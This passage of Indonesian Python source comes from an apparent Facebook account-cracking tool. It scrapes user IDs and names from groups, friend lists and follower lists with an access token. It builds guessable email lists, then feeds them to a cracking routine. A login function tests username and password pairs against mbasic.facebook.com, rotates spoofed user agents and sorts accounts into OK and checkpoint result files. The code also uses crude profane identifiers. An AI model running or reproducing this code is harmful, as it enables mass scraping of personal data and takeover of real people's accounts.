			except:kotak("# SEPERTINYA GRUB YANG ANDA PILIH PRIVAT/TIDAK PUBLIC",M,Q)
		elif "2" in plh:
			try:
				kotak("# UNTUK STOP DUMP TEKAM CTRL + C",I,Q)
				for number in Id_Grub:
					bx += 1
					url = "https://mbasic.facebook.com/groups/"+number
					self.dump_grup_no_login(url)
			except:pass

		else:kotak("# MAAF PILIHAN ANDA TIDAK ADA !!",M,Q);time.sleep(2);self.pilih_grub_()
	def one_groups_joined(self):
		n = 0
		try:
			for i in ses.get(f"https://graph.facebook.com/me/groups?access_token={tiktok}",cookies=puput).json()["data"]:
				name = i["name"]
				uid = i["id"]
				priv = i["privacy"]
				if "OPEN" not in priv:
					pass
				else:
					n +=1
					type = "Grup Publik"
					Id_Grub.append(uid)
					url = parser(ses.get(f"https://mbasic.facebook.com/groups/{uid}").text,"html.parser")
					members = re.findall('Anggota<\/a\>\<\/td\>\<td\ class\=\".*?\">\<span\ class\=\".*?\" id\=\".*?\">(.*?)<\/span\>',str(url))[0]
					todz = me()
					todz.add_column("NO", style=I, justify="center")
					todz.add_column("NAMA DAN ID GRUB", style=I, justify="center",width=50)
					todz.add_column("TYPE GRUB", style=C, justify="center")
					todz.add_column("JUMLAH ANGGOTA GRUB", style=O, justify="center")
					todz.add_row(f"{n}",f'{BB}{name}{II} | {UU}{uid}{QQ}',f"{type}",f"{members}")
					sol().print(todz, justify='center')

		except:pass
		self.pilih_grub_()
		god=""
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def grup_no_login(self):
		idt = input(f" {N}input id groups : ")
		Language.stop_dump()
		url = "https://mbasic.facebook.com/groups/"+idt
		dump_grup_no_login(url)
	def dump_grup_no_login(self,url):
		try:
			data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba"}).text, "html.parser")
			for x in data.find_all("table"):
				par = x.text
				if ">" in par.split(" ") or "mengajukan" in par.split(" "):
					idz = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","")
					if " mengajukan pertanyaan ." in par:nama = par.replace(" mengajukan pertanyaan .","")
					else:nama = par.split(" > ")[0]
					if idz+"<=>"+nama in id:pass
					else:idd.append(idz+"<=>"+nama)
					try:sys.stdout.write(f"\r{q}[{u}Grub{q} : {m}{bx}{q}]{o}Proses Dump Id Grub {q}[{k}ID : {u}{len(idd)}{q}]	");sys.stdout.flush()
					except:sys.stdout.write(f"\r{o}Proses Dump Id Grub {q}[{k}ID : {u}{len(idd)}{q}] 	");sys.stdout.flush()
			for z in data.find_all("a"):
				if "Lihat Postingan Lainnya</span" in str(z).split(">"):
					href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','')
					self.dump_grup_no_login("https://m.facebook.com"+href)
		except:pass



	def random_email(self):
		x = 0

		tod = me()
		tod.add_column("NO", style=K, justify='center')
		tod.add_column("PILIHAN", style=Q, justify='center',width=60)
		tod.add_row("1\n2\n3\n4\n5","Username + @Gmail.com\nUsername + @Yahoo.com\nUsername + @Hotmail.com\nUsername + @Outlook.com\nUsername + @Rocketmail.com")
		sol().print(tod, justify='center')

		ask = input(f">--Pilih 1-4--> ")
		if ask in["1"]:
			email = "@gmail.com"
			nama = input(f">--Masukan Nama--> ")
			jumlah = int(input(f">--Limit--> "))
			for z in range(jumlah):
				x += 1
				idd.append(f"{nama.replace(' ','')}"+str(x)+email+"<=>"+nama)
				idd.append(f"{nama.replace(' ','')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
				idd.append(f"{nama.replace(' ','_')}"+str(x)+email+"<=>"+nama)
				idd.append(f"{nama.replace(' ','.')}"+str(x)+email+"<=>"+nama)
				idd.append(f"{nama.replace(' ','_')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
				idd.append(f"{nama.replace(' ','.')}"+str(x)+"@gmail.co.id"+"<=>"+nama)
		elif ask in["2"]:
			email = "@yahoo.com"
			nama = input(f">--Masukan Nama--> ")
			jumlah = int(input(f">--Limit--> "))
			for z in range(jumlah):
				x += 1
				idd.append(nama+str(x)+email+"<=>"+nama)
		elif ask in["3"]:
			email = "@hotmail.com"
			nama = input(f">--Masukan Nama--> ")
			jumlah = int(input(f">--Limit--> "))
			for z in range(jumlah):
				x += 1
				idd.append(nama+str(x)+email+"<=>"+nama)
		elif ask in["4"]:
			email = "@outlook.com"
			nama = input(f">--Masukan Nama--> ")
			jumlah = int(input(f">--Limit--> "))
			for z in range(jumlah):
				x += 1
				idd.append(nama+str(x)+email+"<=>"+nama)
		elif ask in["5"]:
			email = "@rocketmail.com"
			nama = input(f">--Masukan Nama--> ")
			jumlah = int(input(f">--Limit--> "))
			for z in range(jumlah):
				x += 1
				idd.append(nama+str(x)+email+"<=>"+nama)
		god=""
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()


	def public_mass(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# MASUKAN JUMLAH TARGER",K,Q)
		try:jmlh_ = int(input(">--Jumlah--> "))
		except:jmlh_ = 1
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		for x in range(jmlh_):
			idt = input(f">--{k}Target{q}--> : ")
			limit = ("10000")
			idt = self.ubah_user(idt)
			god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
			try:
				url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
				with requests.Session() as xyz:
					jso = json.loads(xyz.get(url,cookies=puput).text)
					for i in jso["friends"]["data"]:
						try:
							uid = i["id"]
							nama = i["name"]
							idd.append(uid+"<=>"+nama)
						except:pass
			except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def public(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def public_v2(self):
		max=1
		non,idb=[],[]
		jeeck=[]
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						non.append(uid)
					except:pass
		except KeyError:pass
		for rikod in non:
			xx = random.randint(0,len(idb))
			idb.insert(xx,rikod)
		try:
			for ml in non:
				try:
					try:
						goblok = []
						url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(ml,tiktok))
						with requests.Session() as xyz:
							jso = json.loads(xyz.get(url,cookies=puput).text)
							for i in jso["friends"]["data"]:
								try:
									anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
									goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
								except:pass
					except:pass
					todz = me()
					todz.add_column("NO", style=I, justify="center")
					todz.add_column("ID", style=K, justify="center")
					todz.add_column("JUMLAH TEMAN", style=C, justify="center")
					todz.add_row(f'{max}',f'{ml}',f"{len(goblok)}")
					if "0" == f"{len(goblok)}":pass
					else:max+=1;jeeck.append(ml);sol().print(todz, justify='center')
				except KeyboardInterrupt:break
		except:pass
		kotak("# SILAHKAN PILIH TARGET UNTUK DIDUMP !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		idt = jeeck[int(idt)-1]
		limit = ("10000")
		idt = self.ubah_user(idt)
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name).limit(5000)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda\nCrack Dari Random{QQ}({II}Recommended{QQ})")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def follow(self):
		try:
			token = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf data/login.txt")
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		limit = ("10000")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=name,subscribers.fields(id,name).limit(500000)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)

				for i in jso["subscribers"]["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						idd.append(uid+"<=>"+nama)
					except:pass
		except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()

		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Crack Dari Akun Tertua\nCrack Dari Akun Termuda {QQ}({II}Recommended{QQ}){MM}\nCrack Dari Random")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		crack_new().otomatis()
	def cek_jumlah_teman(self):
		try:
			token = open("data/login.txt", "r").read()
			toket = open("data/login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			kotak("# MAAF TOKEN ANDA RUSAK/ERROR",M,Q)
			time.sleep(2)
			os.sys.exit()
		god = ""
		kotak("# SILAHKAN MASUKAM IDZ/USERNAME UNTUK DICRACK !!",C,Q)
		idt = input(f">--{k}Target{q}--> : ")
		idt = self.ubah_user(idt)
		god += ("Nama : "+II+self.ambil_nama(idt)+QQ+"\n")
		try:
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(idt,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						uid = i["id"]
						idd.append(uid)
					except:pass
		except KeyError:pass
		god += "Jumlah Idz Yang Terkumpul : "+II+str(len(idd))+QQ
		if len(idd)==0:
			MML = M
			say = "NOT"
		else:
			MML = I
			say = "YES"
		iprint(Panel(god, title="Information", style=MML))
		if say == "NOT":
			kotak("# MOHON MAAF JUMLAH IDZ YANG TERKUMPUL NOL ATAU TIDAK ADA",M,O)
			os.sys.exit()
		tod = me()
		tod.add_column("NO", style=I, justify="center")
		tod.add_column("PILIHAN", style=M, justify="center", width=60)
		tod.add_row(f"1\n2\n3",f"Check Jumlah Teman Dari Akun Tertua\nCheck Jumlah Teman Dari Akun Termuda\nCheck Jumlah Teman Dari Random")
		sol().print(tod, justify='center')

		hu = input(f'>--{c}Pilih 1-3{q}--> ')
		if hu in ['1','01']:
			for rikod in idd:
				id.append(rikod)
		elif hu in ['2','02']:
			for rikod in idd:
				id.insert(0,rikod)
		elif hu in ['3','03']:
			for rikod in idd:
				xx = random.randint(0,len(id))
				id.insert(xx,rikod)
		else:
			kotak("# LAIN KALI ISI DENGAN BENAR !!", M, Q);time.sleep(4)
			for rikod in idd:
				id.insert(0,rikod)
		with __Kiky__(max_workers=10) as (kiky_gtg):
			for data in id:
				kiky_gtg.submit(self._lonte_, data, toket, token)
	def _lonte_(self, ml, token, toket):
		try:
			goblok = []
			tolol = []
			url = ("https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s"%(ml,tiktok))
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["friends"]["data"]:
					try:
						anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
						goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
					except:pass
			url = ("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token)
			with requests.Session() as xyz:
				jso = json.loads(xyz.get(url,cookies=puput).text)
				for i in jso["data"]:
					try:
						anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw = i["id"]
						tolol.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol_asw)
					except:pass
		except KeyError:pass
		todz = me()
		todz.add_column("ID", style=I, justify="center")
		todz.add_column("JUMLAH TEMAN", style=C, justify="center")
		todz.add_column("JUMLAH PENGIKUT", style=O, justify="center")
		todz.add_row(f'{ml}',f"{len(goblok)}",f"{len(tolol)}")
		if "0" == f"{len(goblok)}":
			if "0" == f"{len(tolol)}":pass
			else:
				sol().print(todz, justify='center')
		else:
			sol().print(todz, justify='center')

	def cekfile_crk(self, folder):
		dirs = os.listdir(folder)
		god_cp,god_ok="",""
		for file in dirs:
			filex = (folder+"/"+file)
			try:
				juma = open(filex,"r").readlines()
				total = ("%s"%(str(len(juma))))
			except:total = (" ?? ")
			try:
				ijo__ = filex.split("results/OK-")[1]
				ijo_ = (QQ+II+"results/OK-"+ijo__)
				god_ok += (ijo_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
			except:pass
			try:
				kuning__ = filex.split("results/CP-")[1]
				kuning_ = (QQ+KK+"results/CP-"+kuning__)
				god_cp += (kuning_+QQ+" <--|--> "+QQ+MM+total+QQ+"\n")
			except:pass
		iprint(Panel(god_ok, style=I, title="RESULTS OK"))
		iprint(Panel(god_cp, style=K, title="RESULTS CP"))
		print()
	def rek(self):
		self.cekfile_crk("results")
		namax=input(f">--Nama File--> ")
		try:
			fila=open(namax,"r").readlines()
		except FileNotFoundError:
			kotak("# MAAF FILE YANG ANDA MASUKAN TIDAK ADA !!", M,Q);time.sleep(3)
			self.rek()
		try:
			volak = namax.split("CP-")[1];copy_ri = ("");Ass = ("%s"%(KK));aSs = KK
		except:
			try:
				vok = namax.split("OK-")[1]
				copy_ri = ("")
				Ass = ("%s"%(II))
				aSs = II
			except:
				copy_ri = ("DARK-FB")
				Ass = ("%s"%(CC))
				aSs = MM
		kotak(f"# JUMLAH AKUN : {len(fila)}",C,Q)
		with __Kiky__(max_workers=30) as (form):
			for data in fila:
				try:
					data = data.replace("\n","")
					try:user,pw,tll = data.split("|")
					except:user,pw = data.split("|");tll=(" - ")
					iprint(Panel(f"{QQ}{Ass}{copy_ri}{QQ}{aSs}{user}|{pw}|{tll}{QQ}", style=Q, title="AKUN"))
				except:pass
				time.sleep(0.01)
	def cek_opsi(self):
		cekfile_crk("results")
		print(">--Contoh-->"+k+"results/CP-"+durasi+".txt"+q)
		files = input('>--Nama File-->')
		try:
			buka_baju = open(files,"r").readlines()
		except FileNotFoundError:
			kotak("# MAAF FILE YANG ANDA MASUKAN TIDAK ADA",M,Q)
			time.sleep(2);self.cek_opsi()
		with __Kiky__(max_workers=25) as kontok:
			for memek in buka_baju:
				kontol = memek.replace("\n","")
				titid  = kontol.split("|")
	#			try:
#					kontok.submit(hide_opsi, titid[0], titid[1], titid[2])
#					kontok.submit(cek_opsi_crack, titid[0], titid[1], titid[2])
	#			except:
				kontok.submit(self.method, titid[0], titid[1])
#					kontok.submit(hide_opsi, titid[0], titid[1], "")
		kotak("# TEKAN ENTER UNTUK KEMBALI",I,Q)
		input()
		Main_()._no_vpn()

	def method(self,user, pasw):
		mb = ("https://mbasic.facebook.com")
		ua15 ="Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.701 Mobile Safari/534.8+"
		ua14 ="Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
		ua13 ="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 OPR/63.3.3216.58675"
		ua1 ="Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977"
		ua10="Mozilla / 5.0 (Linux; Android 5.0; SM-G900P Build / LRX21T; wv) AppleWebKit / 537.36 (KHTML, like Gecko) Version / 4.0 Chrome / 43.0.2357.121 Mobile Safari / 537.36 [ FB _ IAB / FB4A; FBAV / 35.0.0.48.273 ;]"
		ua11="Mozilla / 5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build / 5887208) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 93.0.4577.62 Mobile Safari / 537.36 [FBAN / EMA; FBLC / ID; FBAV / 239.0.0.10.109 ;]"
		ua9="Mozilla / 5.0 (Windows NT 10.0; WOW64) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 93.0.4577.63 Safari / 537.36 [FBAN / EMA; FBLC / id _ ID; FBAV / 239.0.0.10.109 ;]"
		ua8 ="Mozilla / 5.0 (Linux; Android 5.1.1; A37f) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome / 89.0.4389.105 Mobile Safari / 537.36 [FBAN / EMA; FBLC / ID; FBAV / 239.0.0.10.109 ;]"
		ua7 ="Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		ua5="Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
		ua12="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
		ua4="Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 625) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"
		ua3 ="Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 640 LTE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.10586"
		ua2 ="Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/2.0; Touch; rv: 10.0; IEMobile/11.0; NOKIA; Lumia 635) AppleWebKit/537 KHTML, like Gecko) Mobile Safari/537"
		ua = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'])
		ses = requests.Session()
		# kntl bapackkau pecah
		ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		data = {}
		ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
		fm = ged.find("form",{"method":"post"})
		list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
		for i in fm.find_all("input"):
			if i.get("name") in list:
				data.update({i.get("name"):i.get("value")})
			else:
				continue
		data.update({"email":user,"pass":pasw})
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
		if "c_user" in ses.cookies:
			kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
			run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
			xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
			print("\033[0;96m\033[0;97m[\033[1;32m➤\033[1;37m] Successful/OK To Login : %s"%(str(len(xe))))
			num = 0
			for _ in xe:
				num += 1
				print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
		elif "checkpoint" in ses.cookies:
			form = run.find("form")
			dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
			jzst = form.find("input",{"name":"jazoest"})["value"]
			nh   = form.find("input",{"name":"nh"})["value"]
			dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
			xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
			ngew = [yy.text for yy in xnxx.find_all("option")]
			zks("\033[0;96m\033[0;97m[\033[1;33m➤\033[1;37m] Total Available Checkpoint Options:  "+str(len(ngew)))
			for opt in range(len(ngew)):
				print("[\033[1;33m"+str(opt+1)+"\033[1;37m] "+ngew[opt])
			if len(ngew) == 0:
				print("\n\033[0;96m\033[0;97m[\033[1;32m➤\033[1;37m] Status: \033[1;32mOne Tap Yes / SuccessFul To Login")
			elif len(ngew) <= 5:
				print("\n\033[0;96m\033[0;97m[\033[1;33m➤\033[1;37m] Status: \033[1;33mCheckPoint! Try Again Later  ")
			else:
				print('')
		elif "login_error" in str(run):
			oh = run.find("div",{"id":"login_error"}).find("div").text
			print("\033[0;96m\033[0;97m[\033[1;31m➤\033[1;37m] %s"%(oh))
		else:
			print("\033[0;96m\033[0;97m[\033[1;31m➤\033[1;37m] Login Failed! User Id/Password Is Incorrect\n")

class crack_new:
	def __init__(self):
		_ = "UDAH TAU GW CODING SENDIRI ENGGA DIBANTU, NAK KALIAN RIKOD WKWKWK"
	def Kontol_Kau_Ikuti(self,sessionn,cokii):
		try:
